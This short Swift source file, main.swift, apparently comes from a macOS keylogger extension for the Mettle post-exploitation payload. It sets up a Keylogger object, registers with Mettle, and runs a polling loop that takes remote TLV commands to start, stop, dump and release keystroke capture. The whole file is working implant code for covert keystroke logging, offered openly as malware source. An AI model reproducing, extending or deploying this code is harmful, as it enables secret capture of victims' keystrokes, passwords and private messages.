//
//  main.swift
//  Keylogger
//
//  Created by Skrew Everything on 14/01/17.
//  Copyright © 2017 Skrew Everything. All rights reserved.
//
//  Modified by pbarry-r7.
//
import Cocoa
import swift2mettle

// Initialize the keylogger code...
var d = Keylogger()

// Register commands our module accepts with Mettle...
var handle = keylogger_register()

keylogger_log("Keylogger extension loaded...")

var active = true
var curr_state = KEYLOGGER_STATE_STOP
while active {
	usleep(250000)

	// Check for incoming TLV commands/requests...
	keylogger_poll_mettle(handle)

	// See if our state has changed...
	let new_state = keylogger_get_state()
	if curr_state != new_state {
		switch new_state {
		case KEYLOGGER_STATE_STOP:
			break
		case KEYLOGGER_STATE_START:
			break
		case KEYLOGGER_STATE_DUMP:
			break
		case KEYLOGGER_STATE_RELEASE:
			break
		default:
			// Unknown state, not good!
			break
		}
		curr_state = new_state
		keylogger_set_state(curr_state)
	}

	// Allow keylogger code to do its thing...
	RunLoop.main.run(
		mode: RunLoopMode.defaultRunLoopMode,
		before: Date.distantPast)
}
